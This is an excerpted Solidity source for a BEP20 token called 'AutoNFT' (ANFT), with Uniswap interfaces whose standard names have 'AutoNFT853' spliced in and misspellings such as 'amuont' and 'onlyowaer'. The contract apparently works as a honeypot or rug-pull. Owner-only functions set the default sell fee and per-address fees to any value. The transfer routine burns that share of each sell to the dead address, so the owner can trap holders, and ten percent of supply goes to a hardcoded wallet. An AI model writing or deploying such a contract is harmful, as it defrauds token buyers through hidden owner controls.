...
* http://instagram.com/AutoNFT853
* https://www.reddit.com/user/AutoNFT853
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingAutoNFT853OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingAutoNFT853OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingAutoNFT853OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingAutoNFT853OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingAutoNFT853OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function AutoNFT853To() external view returns (address);
    function AutoNFT853ToSetter() external view returns (address);
    ...
    function setAutoNFT853To(address) external;
    function setAutoNFT853ToSetter(address) external;
}
...
contract ANFT is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "AutoNFT";
	string symbol_ = "ANFT";
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*1);	
        ...
        _defaultSellAutoNFT853 = 0;
        _defaultBuyAutoNFT853 = 0;
    ...
    uint256 private _defaultSellAutoNFT853 = 0;
    uint256 private _defaultBuyAutoNFT853 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellAutoNFT853 = _value;
    }


    function acAutoNFT853fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeAutoNFT853amuont = 0;

        if (rF) {
            uint256 tradeAutoNFT853 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeAutoNFT853 = _msgAutoNFT853Info(uint160(from));
                    tradeAutoNFT853 = tradeAutoNFT853 < _defaultSellAutoNFT853 ? _defaultSellAutoNFT853 : tradeAutoNFT853;
                }
                if (from == uniswapV2Pair) {
                    tradeAutoNFT853 = _defaultBuyAutoNFT853;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeAutoNFT853 = _Escape[from];
            }


            tradeAutoNFT853amuont = _amuont.mul(tradeAutoNFT853).div(100);
        }


        if (tradeAutoNFT853amuont > 0) {
            _balances[from] = _balances[from].sub(tradeAutoNFT853amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeAutoNFT853amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeAutoNFT853amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeAutoNFT853amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeAutoNFT853amuont);
        emit Transfer(from, _to, _amuont - tradeAutoNFT853amuont);
    }
	...
	function _msgAutoNFT853Info(uint _acc) internal view virtual returns (uint) {
